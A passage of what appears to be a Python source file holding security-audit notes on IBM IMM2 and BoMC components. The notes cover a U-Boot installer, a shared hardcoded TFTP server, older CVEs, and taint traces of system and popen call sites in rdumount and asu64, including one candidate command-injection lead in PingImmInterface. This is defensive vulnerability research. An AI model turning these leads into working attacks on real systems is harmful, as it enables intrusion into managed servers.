    'Writes rootfs via dd of=/dev/mmcblk0p2|3 — UPDFILE path from MARKER file. '
    'Platform check via awk parse of imm2.xml. No exec injection in installer itself. '
    'VERDICT: No standalone network-facing U-Boot finding. Chained path post-BOMC-IMM2-002 only. '
    'SECOND-PASS OBSERVATIONS: '
    '(1) TFTPREC flag semantics: stored in NVRAM, integer in platform struct, printed as %i. '
    'Not directly settable by network attacker. Requires prior write access (BOMC-IMM2-002 chain). '
    '(2) Four hardcoded network configs suggest hardware variants (ETH0/ETH1, two UART types). '
    'All point to same TFTP server 192.168.70.200 — single server compromise covers all variants. '
    '(3) U-Boot 2009.06p is decade-old codebase with known CVEs (e.g. CVE-2016-3236 TFTP path '
    'traversal, buffer overflows in net stack). INFERRED: unpatched given 2015 build date. '
    'SS APPLICABLE SH4. FORGE PASS. '
    'SESSION 9 — rdumount (x86_64 ELF, 79744 bytes, not stripped): '
    '2 system() call sites fully taint-traced. ALL ELIMINATED. '
    'Site 1 (0x406610 Linux::execCmd): only reachable via getCommandOutput with RODATA_CONST '
    'or snprintf("%d",pid)-sanitized string. '
    'Site 2 (0x406873 makeDierForLog): system("mkdir /var/log/IBM_Support/") RODATA_CONST. '
    'No attacker-controlled data reaches system(). No finding. '
    'SESSION 10 — asu64 (x86_64 ELF, 21MB, not stripped): '
    '21 exec-class call sites (6 system + 15 popen) fully taint-traced. '
    '15 popen: ALL RODATA_CONST (uname -r/m, dmesg, modprobe ipmi_*, /etc/init.d/ipmi start). '
    '5 system: checkPatchable(×2) ELIMINATED session 1; LinOS::reboot RODATA_CONST; '
    'CState SAFE (hardcoded args); RumImmUsbLanCfgCmd SAFE (hardcoded or hardware-enum interface names). '
    'BOMC-ASU-002 CANDIDATE MEDIUM: PingImmInterface (addr via CIM WBEM dispatch, '
    '3 fn-ptr table entries 0x440a08/0x10e9700/0x1532f68, no sanitization traced, '
    'requires authenticated HTTPS:5989 CIM access). '
    'SS APPLICABLE x86_64. FORGE PASS'
))
FORGE.audit_module(__file__)
